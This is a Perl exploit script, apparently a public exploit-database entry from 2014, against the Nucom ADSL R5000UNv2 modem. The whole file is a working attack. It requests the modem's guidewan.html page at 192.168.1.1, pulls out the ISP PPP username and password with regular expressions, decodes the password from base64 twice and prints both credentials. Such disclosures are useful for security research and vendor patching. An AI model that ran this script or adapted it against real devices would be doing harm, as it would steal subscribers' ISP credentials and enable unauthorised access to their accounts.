#!/usr/bin/perl 
# Exploit Author: SebastiáMagof 
# Hardware: Modem Nucom ADSL R5000UNv2  
# Software Version: R5TC008
# Vulnerable file: guidewan.html
# location: http://gateway/telecom_GUI/guidewan.html                  
# Bug: ISP usr+pwd disclosure 
# Type: Local 
# Date: 24/09/2014
# Vendor Homepage: http://www.nucom.hk/
# Version: 2.00(R5TC008)
# Tested on: Linux Fedora 20/Windows 7
# (\/)
# (**) Alpha (:
#(")(")
#MADE IN ARGENTINA;
#usage:perl exploit.pl
use LWP::UserAgent;
use HTTP::Request;
use MIME::Base64;
#begin
print "\n\n************************************************************\n";
print "* Modem Nucom ADSL R5000UNv2 ISP credentials disclosure    *\n";#default gateway 192.168.1.1 (Arnet Telecom ISP Argentina) 
print "************************************************************\n\n";
  
   
#isp pwd disclosure file
my $url = "http://192.168.1.1/telecom_GUI/guidewan.html"; 
    
   
#UserAgent
my $ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0");
    
   
#Request.
my $req = HTTP::Request->new(GET => $url);
my $request = $ua->request($req);
my $content = $request->content(); #content
my ($pwd) = $content =~ m/pppPassword.value = '(.+)';/;
my ($usr) = $content =~ m/pppUserName.value = '(.+)';/;
#decode base64 2 times pwd;
$encoded = $pwd;
$decoded = decode_base64($encoded); #decode base64 pwd;
$decoded2 = decode_base64($decoded); #2nd base64 pwd;
#ISP usr+pwd Arnet Telecom Argentina;
print "User: $usr\n";
print "Password: $decoded2\n\n";
exit(0);

